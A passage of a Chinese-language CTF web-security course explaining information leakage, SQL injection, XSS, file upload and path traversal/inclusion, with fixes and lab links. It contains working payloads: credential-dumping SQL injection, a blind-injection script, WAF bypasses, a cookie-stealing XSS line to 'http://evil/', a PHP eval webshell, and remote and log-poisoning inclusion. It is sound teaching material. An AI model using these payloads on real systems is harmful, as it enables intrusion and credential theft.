+<ol class="steps"><li><b>输入从哪进来</b>：URL 参数、表单、JSON、Cookie、请求头（Referer / XFF / UA）、文件名、甚至上传的图片内容。</li><li><b>它被送到了哪里</b>：数据库、文件系统、shell、模板引擎、反序列化函数、内网 HTTP 请求。这一步决定漏洞类型。</li><li><b>中间有没有过滤，过滤做在哪一层</b>：前端 JS（等于没有）、后端关键字替换（通常可绕）、WAF（看规则）、类型强转（最有效）。</li></ol>
+<h3>学习顺序（不要跳）</h3>
+<ul><li><b>先会读源码</b>：同一个 payload 在 PHP / Python / Java 里长得完全不一样，读不懂源码就只能背题。</li><li><b>再认漏洞</b>：能在一段代码里指认出「这行是注入点」，比记住 100 个 payload 有价值。</li><li><b>然后练 payload</b>：把每一类的 3–5 个标准 payload 练到能默写。</li><li><b>最后练思路</b>：真实题目不会告诉你「这是 SQL 注入」，要靠 PART 9 的决策树自己判断。</li></ul>
+<blockquote class="note">💡 分类不是为了考试，是为了<b>检索</b>：看到「输入进了数据库」就去翻 SQLi 那节；看到「要求输入 URL」就去翻 SSRF 那节。本 PART 的每一节都按同一个结构写：原理 → 判断 → 利用 → 修复。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10（2021）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>把 18 类漏洞按「被当成什么」分成 6 组，各写一个例子。</li><li>「文件上传」和「文件包含」为什么分在不同组？</li><li>为什么说「前端过滤等于没有过滤」？</li><li>拿到一道陌生题目，你会先看哪三样东西？</li></ol>
+</article>
+<article id="l-p5l2">
+<h2>信息泄露</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>系统化检查一个站「不该给的东西」，并会把泄露变成下一步的入口。</p></div>
+<p>信息泄露本身往往不是最终目的，而是<b>解题的钥匙</b>：拿到源码就知道漏洞在哪，拿到备份就知道数据库结构，拿到 .git 就拿到了整个历史版本。CTF 里 90% 的「这题好难」其实是「我还没找到泄露点」。</p>
+<div class="tablewrap"><div class="tcap">常见泄露点清单</div><table><thead><tr><th>位置</th><th>典型对象</th><th>拿到之后能干什么</th></tr></thead><tbody><tr><td>前端</td><td>HTML 注释、隐藏 input、内联 JS 常量、source map</td><td>直接读 flag / 找到隐藏接口</td></tr><tr><td>源码备份</td><td>www.zip、web.zip、index.php.bak、.index.php.swp</td><td>审计出真正的漏洞点</td></tr><tr><td>版本库</td><td>.git/、.svn/、.hg/</td><td>还原全部历史源码</td></tr><tr><td>配置</td><td>.env、config.php、composer.json、package.json</td><td>数据库账号、密钥、依赖版本</td></tr><tr><td>调试</td><td>/debug、/console、actuator/env、phpinfo.php、错误堆栈</td><td>环境变量、路径、内存信息</td></tr><tr><td>目录</td><td>robots.txt、/admin/、/backup/、目录列表</td><td>发现后台与备份</td></tr><tr><td>指纹</td><td>X-Powered-By、Server、静态资源 hash、Cookie 名</td><td>判断框架与版本，选对应的利用链</td></tr></tbody></table></div>
+<h3>动手：五分钟基线检查</h3>
+<ol class="steps"><li>看响应头：<code>curl -I</code>，记下 Server / X-Powered-By / Set-Cookie，判断语言与框架。</li><li>看 robots.txt 与 sitemap.xml：管理员路径、备份目录经常就写在这里。</li><li>看页面源码：Ctrl+F 搜 <code>flag</code>、<code>api</code>、<code>key</code>、<code>token</code>、<code>password</code>。</li><li>猜备份文件：常见命名 <code>www.zip</code>、<code>web.zip</code>、<code>backup.zip</code>、<code>index.php.bak</code>、<code>.index.php.swp</code>，用 dirsearch 批量跑。</li><li>试版本库：<code>/.git/config</code> 返回 200 就是泄露，用 GitHack / git-dumper 拉全量。</li><li>看错误：故意传一个非法参数触发报错，报错里常带绝对路径、框架版本、SQL 语句。</li></ol>
+<div class="code"><div class="cbar">最常用的几个探测 · bash</div><pre><code>curl -I https://target/                     # 响应头指纹
+curl https://target/robots.txt
+curl https://target/.git/config              # 200 = Git 泄露
+curl https://target/www.zip -o a.zip -s -w "%{http_code}\n"
+curl https://target/index.php.bak -s -w "%{http_code}\n"
+
+# 目录扫描（合法靶场上用）
+dirsearch -u https://target/ -e php,bak,zip,txt,swp</code></pre></div>
+<div class="code"><div class="cbar">Git 泄露的利用 · bash</div><pre><code># 方案一：GitHack（Python2，按目录还原）
+python GitHack.py http://target/.git/
+
+# 方案二：git-dumper（更稳，推荐）
+git-dumper http://target/.git/ ./src_leak
+
+# 还原之后看历史记录，flag 常在已经"删掉"的提交里
+cd src_leak &amp;&amp; git log --all --oneline &amp;&amp; git show &lt;commit&gt;</code></pre></div>
+<h3>source map 为什么危险</h3>
+<p>打包工具会把多个源文件压缩成一个 <code>app.min.js</code>，同时生成 <code>app.min.js.map</code> 记录「每个字符来自哪个源文件」。这个 .map 一旦留在线上，压缩代码就等于源码全公开——变量名、注释、甚至你没打算发布的调试逻辑都回来了。F12 → Sources 里能看到原文件列表，就是这个 .map 生效了。</p>
+<h3>修复</h3>
+<ul><li>上线前删除 <code>.git</code>、<code>.svn</code>、<code>.DS_Store</code>、备份文件、编辑器的 swap 文件。</li><li>生产环境关闭详细报错（PHP: <code>display_errors=Off</code>），错误写日志而不是打印给用户。</li><li>source map 不要随静态资源一起发布，或放在访问不到的位置。</li><li>敏感配置（数据库密码、密钥）只放在服务端环境变量里，永不进前端。</li><li>给 <code>/admin</code>、<code>/backup</code> 这类目录加访问控制，别指望「没人知道这个路径」。</li></ul>
+<blockquote class="note">💡 信息收集要有边界：以上探测只在<b>自己搭的靶场</b>或<b>明确授权</b>的目标上做。对真实站点做目录扫描，在大多数国家和地区都需要书面授权。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · 信息泄露专项（Git/备份/目录）</a></li><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch（目录扫描）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么 .git 泄露比一个 .zip 备份更危险？</li><li>source map 泄露的是什么信息？怎么在浏览器里确认它生效了？</li><li>robots.txt 为什么会成为情报来源？它本来的用途是什么？</li><li>写出三个常见的源码备份文件名。</li><li>生产环境应该怎么处理报错信息？</li></ol>
+</article>
+<article id="l-p5l3">
+<h2>SQL 注入（上）：原理与联合查询</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解拼接为什么危险，会判断字段数、找显位、用 UNION 把数据取出来。</p></div>
+<p>SQL 注入的本质只有一句话：<b>用户输入变成了 SQL 语句的一部分，而不是一个值。</b>下面这段代码在 PHP 里极其常见：「把 id 拼进查询字符串」。</p>
+<div class="code"><div class="cbar">漏洞是怎么产生的 · php</div><pre><code>&lt;?php
+$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = $id";   // 直接拼接
+$row = mysqli_query($conn, $sql);
+
+// 正常请求：?id=1
+//   SELECT * FROM users WHERE id = 1
+
+// 攻击请求：?id=1 OR 1=1
+//   SELECT * FROM users WHERE id = 1 OR 1=1      -&gt; 全表返回
+?&gt;</code></pre></div>
+<p>注意这个变化：<b>1</b> 是一个值，<b>1 OR 1=1</b> 是三个值加一个条件。拼接之后，数据库看到的已经不是「一个数字」，而是一段带逻辑的语句。这就是注入成立的根。</p>
+<h3>判断注入：四步都做完再下结论</h3>
+<ol class="steps"><li><b>加引号看报错</b>：<code>?id=1'</code> 出现 SQL 语法报错 → 大概率是字符型注入。</li><li><b>比较真假</b>：<code>?id=1 and 1=1</code> 与 <code>?id=1 and 1=2</code> 的响应内容/长度不同 → 注入成立。</li><li><b>判断类型</b>：数字型（<code>id=1</code>）、字符型（<code>id='1'</code>）、搜索型（<code>like '%1%'</code>）；字符型要闭合引号。</li><li><b>判断字段数</b>：<code>order by 1</code> 到 <code>order by N</code>，直到报错，N-1 就是字段数。</li></ol>
+<div class="code"><div class="cbar">标准利用步骤（MySQL） · sql</div><pre><code>?id=1 order by 3 --            字段数 = 3
+?id=-1 union select 1,2,3 --    找显位（-1 让前一条空，页面才会显示 union 的结果）
+?id=-1 union select 1,database(),3 --
+?id=-1 union select 1,user(),3 --
+?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
+?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
+?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --</code></pre></div>
+<div class="tablewrap"><div class="tcap">每一步在问什么</div><table><thead><tr><th>目的</th><th>payload 关键部分</th><th>为什么这样写</th></tr></thead><tbody><tr><td>判断字段数</td><td>order by N</td><td>按第 N 列排序，列不存在就报错</td></tr><tr><td>让原查询为空</td><td>id=-1</td><td>否则原记录占满页面，union 的结果显示不出来</td></tr><tr><td>找显位</td><td>union select 1,2,3</td><td>看页面哪个位置回显了数字，那个位置就是输出点</td></tr><tr><td>看库名版本</td><td>database() / version()</td><td>先确认权限与环境</td></tr><tr><td>看表名</td><td>information_schema.tables</td><td>MySQL 自带的元数据表，存着所有表和列</td></tr><tr><td>看列名</td><td>information_schema.columns</td><td>同上，定位目标表结构</td></tr><tr><td>取值</td><td>group_concat(a,0x3a,b)</td><td>0x3a 是冒号，把用户名和密码拼成一行</td></tr></tbody></table></div>
+<h3>为什么「过滤关键字」不是修复</h3>
+<p>如果只把 <code>select</code>、<code>union</code> 替换成空，攻击者用 <code>SeLeCt</code>、<code>sel/**/ect</code>、<code>/*!50000select*/</code> 就能绕过。根本原因是<b>SQL 语句本身参与了字符串拼接</b>，只要结构还能被输入改变，绕过只是成本问题。</p>
+<div class="code"><div class="cbar">正确修复：参数化查询 · php</div><pre><code>&lt;?php
+// PDO 预处理：SQL 结构先定死，参数后传进去
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = ?");
+$stmt-&gt;execute([$_GET['id']]);
+$row = $stmt-&gt;fetch();
+
+// mysqli 预处理
+$stmt = $conn-&gt;prepare("SELECT * FROM users WHERE id = ?");
+$stmt-&gt;bind_param("i", $_GET['id']);      // i = 整数，类型强转
+$stmt-&gt;execute();
+?&gt;</code></pre></div>
+<blockquote class="note">💡 参数化查询的关键不是「过滤了危险字符」，而是<b>数据库永远只把参数当值，不当语法</b>。同样的原理也适用于所有 ORM：用占位符，不要用字符串拼 SQL。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/skyous/sqli-labs" target="_blank" rel="noopener">SQLi-Labs Less-1 ~ Less-4（联合查询）</a></li><li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger · SQL Injection</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>order by 为什么能判断字段数？报错前一个数字代表什么？</li><li>union select 前面为什么要用 -1 或 and 1=2？</li><li>information_schema 是什么？为什么它能查到所有表名？</li><li>为什么「把 select 这个词过滤掉」挡不住注入？</li><li>用 PDO 写一遍安全的查询代码。</li></ol>
+</article>
+<article id="l-p5l4">
+<h2>SQL 注入（下）：盲注、报错、绕过</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>页面不回显时，仍能通过布尔、时间、报错三条路把数据一点点取出来，并知道什么时候必须写脚本。</p></div>
+<p>真实题目里，注入点常常「不回显」：页面只有「用户存在 / 不存在」两个状态，或者干脆只给一个正常页面。这时要把数据库当成一个<b>只能回答是/否的黑盒</b>，用问题一位一位地把数据问出来。</p>
+<div class="code"><div class="cbar">布尔盲注：看真假 · sql</div><pre><code>?id=1 and length(database())=4 --           库名长度是不是 4
+?id=1 and substr(database(),1,1)='a' --      第 1 个字符是不是 a
+?id=1 and ascii(substr(database(),1,1))&gt;97 -- 用 ASCII 区间做二分，快得多</code></pre></div>
+<div class="code"><div class="cbar">时间盲注：看延时 · sql</div><pre><code>?id=1 and if(length(database())=4,sleep(3),0) --
+?id=1 and if(ascii(substr(database(),1,1))&gt;97,sleep(3),0) --
+
+# 其他数据库
+SQL Server: ;waitfor delay '0:0:3' --
+PostgreSQL: ;select pg_sleep(3) --</code></pre></div>
+<div class="code"><div class="cbar">报错注入：看报错回显 · sql</div><pre><code># MySQL（5.1–5.7 常见，需报错信息回显）
+?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --
+?id=1 and extractvalue(1,concat(0x7e,(select database()))) --
+
+# 原理：把查询结果拼进报错信息里，报错被回显到页面
+# 0x7e 是 ~，用来分隔数据方便提取</code></pre></div>
+<div class="tablewrap"><div class="tcap">三条路怎么选</div><table><thead><tr><th>手法</th><th>依赖条件</th><th>速度</th><th>什么时候用</th></tr></thead><tbody><tr><td>联合查询</td><td>有回显、字段数已知</td><td>最快</td><td>页面会把查询结果打印出来</td></tr><tr><td>报错注入</td><td>报错信息回显到页面</td><td>快</td><td>有回显但只有报错，或 union 被拦</td></tr><tr><td>布尔盲注</td><td>页面有「真/假」两种可区分的状态</td><td>中</td><td>无回显，但响应有差异（长度/内容/状态码）</td></tr><tr><td>时间盲注</td><td>什么都看不出来，只能靠响应时间</td><td>最慢</td><td>以上全不行，最后的办法</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">布尔盲注脚本骨架 · python</div><pre><code>import requests, string
+
+url = "http://target/?id=1"
+chars = string.ascii_lowercase + string.digits + "_{}-"
+result = ""
+
+for pos in range(1, 40):
+    for ch in chars:
+        payload = f"1' and substr(database(),{pos},1)='{ch}' -- "
+        r = requests.get(url, params={"id": payload})
+        if "存在" in r.text:          # 用页面上的"真"信号判断
+            result += ch
+            print(pos, ch, result)
+            break
+    else:
+        break
+
+print("命中:", result)</code></pre></div>
+<blockquote class="note">💡 盲注必须脚本化。手工逐位猜 20 个字符要几百次请求，写脚本 20 行就搞定——这正是 PART 4 讲 Python 的原因。二分法（先判断 ASCII 范围再缩小）比逐字符遍历快 5 倍以上。</blockquote>
+<h3>WAF 绕过的常见手法</h3>
+<div class="tablewrap"><div class="tcap">绕过对照表</div><table><thead><tr><th>被拦的东西</th><th>绕过写法</th><th>说明</th></tr></thead><tbody><tr><td>大小写</td><td>SeLeCt / UnIoN</td><td>很多正则不忽略大小写</td></tr><tr><td>空格</td><td>sel/**/ect、%09、%0a、+</td><td>注释和空白符都能当分隔</td></tr><tr><td>关键字</td><td>sel/**/ect、双写 selselectect</td><td>替换时只替换一次就能绕过</td></tr><tr><td>内联注释</td><td>/*!50000select*/</td><td>MySQL 特有，注释里的内容会被执行</td></tr><tr><td>引号</td><td>0x61646d696e（十六进制）</td><td>避免出现引号被过滤</td></tr><tr><td>and/or</td><td>&& / || / xor</td><td>运算符等价替换</td></tr><tr><td>等号</td><td>like、regexp、in、between</td><td>同样的语义换函数</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">sqlmap 的定位：省力的工具，不是替代理解 · bash</div><pre><code># 先手工确认注入点和参数，再用工具放大
+sqlmap -u "http://target/?id=1" --batch --dbs
+sqlmap -u "http://target/?id=1" -D dbname --tables
+sqlmap -u "http://target/?id=1" -D dbname -T users --dump
+
+# 请求有 Cookie / 头时，用请求文件更省事
+sqlmap -r req.txt -p id --batch --level 3 --risk 2</code></pre></div>
+<blockquote class="note">💡 比赛里 sqlmap 常常被 WAF 拦。真正稳定的路线是：<b>先判断注入类型 → 先试 union / 报错 → 不行再写盲注脚本</b>。工具帮你省时间，但不能帮你绕过你没理解的东西。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/skyous/sqli-labs" target="_blank" rel="noopener">SQLi-Labs Less-8 ~ Less-17（盲注 / 报错专区）</a></li><li><a href="https://portswigger.net/web-security/sql-injection/blind" target="_blank" rel="noopener">PortSwigger · Blind SQL injection</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>布尔盲注和时间盲注最核心的区别是什么？</li><li>报错注入依赖什么前提？updatexml 在这里起什么作用？</li><li>二分法为什么比逐字符遍历快？</li><li>列出三种把空格绕过去的方法。</li><li>为什么盲注场景必须写脚本？</li></ol>
+</article>
+<article id="l-p5l5">
+<h2>XSS：反射、存储、DOM</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。</p></div>
+<p>XSS 的本质和 SQL 注入一模一样：<b>用户输入被当成 HTML/JS 代码，交给了浏览器执行。</b>区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。</p>
+<div class="tablewrap"><div class="tcap">三类对比</div><table><thead><tr><th>类型</th><th>数据路径</th><th>触发时机</th><th>典型场景</th></tr></thead><tbody><tr><td>反射型</td><td>输入 → 服务器 → 立刻写回响应 → 浏览器执行</td><td>受害者点开构造好的链接</td><td>搜索结果页、错误提示回显参数</td></tr><tr><td>存储型</td><td>输入 → 数据库 → 别人访问页面时取出执行</td><td>任何人打开页面就中招</td><td>留言板、昵称、评论、工单</td></tr><tr><td>DOM 型</td><td>输入 → 前端 JS 直接写进 DOM（不经过服务器）</td><td>页面内 JS 处理 URL/hash 时</td><td>document.write(location.hash)、innerHTML</td></tr></tbody></table></div>
+<p>三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。</p>
+<h3>先判断落点，再选 payload</h3>
+<div class="tablewrap"><div class="tcap">上下文 → payload</div><table><thead><tr><th>落点位置</th><th>payload 思路</th><th>示例</th></tr></thead><tbody><tr><td>HTML 正文</td><td>直接插标签</td><td>&lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt;</td></tr><tr><td>属性值里（双引号）</td><td>先闭合属性再插事件</td><td>" onmouseover="alert(1)</td></tr><tr><td>属性值里（单引号）</td><td>同上，换单引号</td><td>' onfocus='alert(1)' autofocus='</td></tr><tr><td>&lt;script&gt; 内部字符串</td><td>闭合 script 标签</td><td>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td></tr><tr><td>href / src</td><td>伪协议</td><td>javascript:alert(1)</td></tr><tr><td>CSS / style 里</td><td>expression / 类 CSS 注入</td><td>看浏览器版本，现代浏览器基本堵死</td></tr><tr><td>JSON 回显</td><td>先看是否 text/html 渲染</td><td>{"name":"&lt;img src=x onerror=alert(1)&gt;"}</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">存储型最小复现（留言板） · php</div><pre><code>&lt;?php
+// 后端：把用户输入直接存库、直接输出
+$msg = $_POST['msg'];
+mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");
+
+// 页面渲染
+echo "&lt;div class='msg'&gt;" . $row['msg'] . "&lt;/div&gt;";
+// 输入 &lt;img src=x onerror=alert(document.cookie)&gt;
+// 之后每个访问留言板的人都会执行它
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">DOM 型最小复现 · js</div><pre><code>// 页面里写了这样一段（很常见）
+var name = location.hash.slice(1);
+document.getElementById("hello").innerHTML = "你好，" + name;
+
+// 访问：http://target/#&lt;img src=x onerror=alert(1)&gt;
+// 服务器完全没参与，日志里只有一条正常请求</code></pre></div>
+<h3>拿到 XSS 之后能干什么</h3>
+<ul><li><b>偷 Cookie</b>：<code>new Image().src='http://evil/'+document.cookie</code>（HttpOnly 的 Cookie 读不到）。</li><li><b>发请求</b>：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。</li><li><b>改页面</b>：伪造登录框钓密码，或把转账按钮改成「领红包」。</li><li><b>读 DOM</b>：页面里渲染出来的敏感信息、前端存的 token，全都能读走。</li></ul>
+<h3>修复：输出编码 + 纵深防御</h3>
+<div class="code"><div class="cbar">按上下文转义 · php</div><pre><code>&lt;?php
+// HTML 正文 / 属性：htmlspecialchars
+echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');
+
+// JS 字符串里：json_encode 而不是手拼引号
+echo "&lt;script&gt;var name = " . json_encode($msg) . ";&lt;/script&gt;";
+
+// URL 里：urlencode
+echo "&lt;a href='?q=" . urlencode($q) . "'&gt;搜索&lt;/a&gt;";
+?&gt;</code></pre></div>
+<blockquote class="note">💡 三道防线缺一不可：<b>输出时按上下文编码</b>（根治）、<b>HttpOnly</b>（Cookie 偷不走）、<b>CSP</b>（就算漏了也执行不了内联脚本）。前端框架的 <code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>v-html</code> 都是新雷区。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/do0dl3/xss-labs" target="_blank" rel="noopener">XSS-Labs（1–20 关）</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">PortSwigger · XSS</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>存储型和反射型的最大区别是什么？为什么存储型危害更大？</li><li>DOM 型 XSS 为什么在服务器日志里看不到 payload？</li><li>payload 落在 &lt;script&gt; 内部的字符串里，和落在 HTML 正文里，写法有什么不同？</li><li>HttpOnly 能防住 XSS 吗？它防住了什么？</li><li>写出 PHP 里按上下文转义的三种做法。</li></ol>
+</article>
+<article id="l-p5l6">
+<h2>文件上传</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>掌握五类上传校验的绕过方式，理解「能传上去」和「能执行」的区别。</p></div>
+<p>文件上传漏洞的价值不在「传上去了」，而在「<b>传上去的文件能被服务器当代码执行</b>」。所以每道上传题的核心问题永远是：服务器会不会执行我传的这个文件？</p>
+<div class="tablewrap"><div class="tcap">五道关，逐一突破</div><table><thead><tr><th>检查点</th><th>它怎么拦</th><th>怎么绕</th></tr></thead><tbody><tr><td>前端 JS 校验</td><td>onchange 检查后缀</td><td>直接改包（Burp / curl），或删掉页面上的 JS</td></tr><tr><td>Content-Type</td><td>要求 image/png</td><td>改请求里的 Content-Type，不影响真实内容</td></tr><tr><td>后缀黑名单</td><td>禁止 .php</td><td>.php3 .phtml .pht .phps .pHp；Windows 的 .php. 与 .php::$DATA</td></tr><tr><td>后缀白名单</td><td>只允许 .jpg</td><td>解析漏洞：Apache 多后缀 a.php.jpg、Nginx 配置错误、/1.php/. 路径穿越</td></tr><tr><td>内容/文件头检测</td><td>检查 magic bytes</td><td>图片马（GIF89a + PHP 代码）+ 文件包含；或二次渲染绕过</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">典型的不安全上传后端 · php</div><pre><code>&lt;?php
+// 只检查了后缀黑名单
+$name = $_FILES['file']['name'];
+$ext  = strtolower(substr($name, strrpos($name, '.')));
+$blocked = ['php', 'php5', 'php7'];
+
+if (!in_array($ext, $blocked)) {
+    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $name);
+    echo "上传成功：" . $name;
+} else {
+    echo "不允许的类型";
+}
+?&gt;</code></pre></div>
+<h3>绕过流程</h3>
+<ol class="steps"><li>先传一个正常的 jpg 确认功能可用，记住返回的访问路径。</li><li>改成 <code>shell.php</code> 传，看拦截信息 —— 是前端弹窗（改包就能过）还是后端报错（要换后缀）。</li><li>换后缀：<code>.phtml</code>、<code>.php3</code>、<code>.phps</code>、<code>.pht</code>，逐个试到能上传。</li><li>还不行就试 <code>shell.php.jpg</code>（解析漏洞）、<code>shell.php%00.jpg</code>（老版本截断）、<code>shell.php.</code>（Windows 去点）。</li><li>传上去之后，访问返回的路径，看是否被解析执行。<b>不能执行就只是存了个文件，不算 getshell。</b></li></ol>
+<div class="code"><div class="cbar">图片马 + 文件包含 · bash</div><pre><code># 把 PHP 代码藏在图片里，图片本身仍然能正常显示
+copy normal.gif shell.php
+echo "&lt;?php @eval($_POST['c']); ?&gt;" &gt;&gt; shell.php
+
+# 单靠图片马不够，还要有文件包含把这个"图片"当 PHP 执行
+# ?page=uploads/shell.gif
+# 或者 .htaccess / .user.ini 让 .gif 被当 PHP 解析</code></pre></div>
+<div class="code"><div class="cbar">.htaccess 与 .user.ini · text</div><pre><code># .htaccess（Apache）：让所有 .jpg 按 PHP 解析
+AddType application/x-httpd-php .jpg
+
+# .user.ini（PHP-FPM）：在每个请求前自动包含你的文件
+auto_prepend_file=shell.jpg
+
+# 条件竞争：先上传到临时目录再检查/删除
+# 趁检查前的窗口期，用多线程疯狂访问，抢在被删之前执行</code></pre></div>
+<h3>修复</h3>
+<ul><li><b>白名单后缀</b>，白名单要包含解析顺序（只留 .jpg/.png/.gif）。</li><li><b>重命名</b>：用随机文件名 + 固定后缀，别用用户给的名字。</li><li><b>上传目录禁止执行</b>：Nginx 里 <code>location ~ \.(php)$ { deny all; }</code>，Apache 用 <code>php_flag engine off</code>。</li><li><b>校验内容</b>：magic bytes + 图片二次渲染；但内容校验也不是万能，最好配合「不执行」。</li><li><b>存储分离</b>：文件放对象存储/CDN，Web 服务根目录根本访问不到。</li></ul>
+<blockquote class="note">💡 上传题最省时间的做法：<b>先用 Burp 抓到上传请求，之后所有测试都在 Repeater 里改包重放</b>，不要在浏览器里反复点。改后缀、改 Content-Type、改文件名都是同一件事：改一个字段，发一次。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">Upload-Labs（1–21 关）</a></li><li><a href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">PortSwigger · File upload</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>前端校验为什么等于没有校验？</li><li>上传成功之后，怎么判断这次算不算真正利用了漏洞？</li><li>.htaccess 上传能实现什么效果？它需要什么前提？</li><li>图片马为什么要配合文件包含才有效？</li><li>列出三条上传漏洞的修复措施。</li></ol>
+</article>
+<article id="l-p5l7">
+<h2>路径穿越与文件包含</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解「用户控制路径」的两种危害：读任意文件、执行任意代码。</p></div>
+<p>「用户能控制路径」听起来无害，但它同时意味着两件事：<b>能读到不该读的文件</b>（路径穿越），以及<b>能包含不该包含的文件</b>（文件包含，最终常常变成代码执行）。</p>
+<div class="code"><div class="cbar">路径穿越：下载功能 · php</div><pre><code>&lt;?php
+// 设计意图：只允许下载 files/ 目录下的报告
+$file = $_GET['file'];
+readfile("./files/" . $file);
+?&gt;
+
+# 正常：?file=report.pdf
+# 攻击：?file=../../../../etc/passwd
+# 攻击：?file=../../../../var/www/html/config.php   （读源码找数据库密码）</code></pre></div>
+<div class="tablewrap"><div class="tcap">过滤与绕过</div><table><thead><tr><th>过滤方式</th><th>绕过写法</th></tr></thead><tbody><tr><td>过滤 ../</td><td>....// （删掉 ../ 后剩下 ../）、..%2f、..%252f（二次解码）</td></tr><tr><td>过滤绝对路径</td><td>不给绝对路径，用层层 ../ 走上去</td></tr><tr><td>只允许前缀目录</td><td>..\..\ （Windows 反斜杠）、%5c</td></tr><tr><td>检查后缀</td><td>a.php%00.jpg（老版本 PHP 截断）、路径末尾加点/空格（Windows）</td></tr><tr><td>WAF 拦 ../</td><td>编码变形：%2e%2e%2f、..%c0%af（畸形编码）</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">文件包含：把路径交给 include · php</div><pre><code>&lt;?php
+$page = $_GET['page'];
+include("./pages/" . $page . ".php");
+
+// 正常：?page=about        -&gt; include ./pages/about.php
+// 读源码（不执行）：?page=php://filter/convert.base64-encode/resource=index
+// 远程代码（需 allow_url_include=On）：?page=http://evil.com/shell.txt
+// 日志包含：?page=../../../../var/log/apache2/access.log
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">PHP 伪协议速查</div><table><thead><tr><th>协议</th><th>用途</th><th>前提</th></tr></thead><tbody><tr><td>php://filter</td><td>读文件源码（base64 编码后返回）</td><td>任意 PHP 版本</td></tr><tr><td>php://input</td><td>读 POST 原始体，可配合 auto_prepend 执行</td><td>allow_url_include=On</td></tr><tr><td>data://</td><td>把数据当文件包含，直接执行代码</td><td>allow_url_include=On</td></tr><tr><td>expect://</td><td>直接执行命令</td><td>装了 expect 扩展</td></tr><tr><td>http(s)://</td><td>远程包含，代码在远程服务器上</td><td>allow_url_include=On</td></tr><tr><td>zip:// / phar://</td><td>包含压缩包内文件；phar 还能触发反序列化</td><td>通常默认可用</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">日志包含：把代码写进日志再包含它 · bash</div><pre><code># 1. 让访问日志里出现 PHP 代码（UA 或 URL 里带）
+curl -A "&lt;?php system('id'); ?&gt;" http://target/
+
+# 2. 包含日志文件，代码被执行
+?page=../../../../var/log/apache2/access.log
+?page=../../../../var/log/nginx/access.log
+
+# 也可以用 /proc/self/environ（环境变量里塞代码）</code></pre></div>
+<p>包含的利用深度完全取决于配置：<code>allow_url_include=On</code> 才能远程包含，<code>open_basedir</code> 会限制目录范围。所以拿到包含点后<b>先读 phpinfo 或配置，再决定用哪种方式</b>，不要一上来就试远程包含。</p>
+<blockquote class="note">💡 修复其实很简单，两步：<b>用白名单映射</b>（请求的 key 对应固定的真实路径，而不是把用户输入拼进路径），<b>用 realpath 校验</b>（拼完之后解析出真实绝对路径，确认它仍在允许目录内）。文件包含还应禁用远程包含。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · 文件包含 / 路径穿越</a></li><li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">PortSwigger · Path traversal</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>php://filter 为什么能读源码而不执行它？</li><li>../ 被过滤成空之后，还有什么写法？</li><li>远程包含需要哪个配置项？为什么默认是关闭的？</li><li>日志包含利用了哪个特性？为什么它能变成代码执行？</li><li>用白名单 + realpath 写出安全的文件读取代码。</li></ol>
+</article>
+<article id="l-p5l8">
+<h2>命令执行与代码执行</h2>
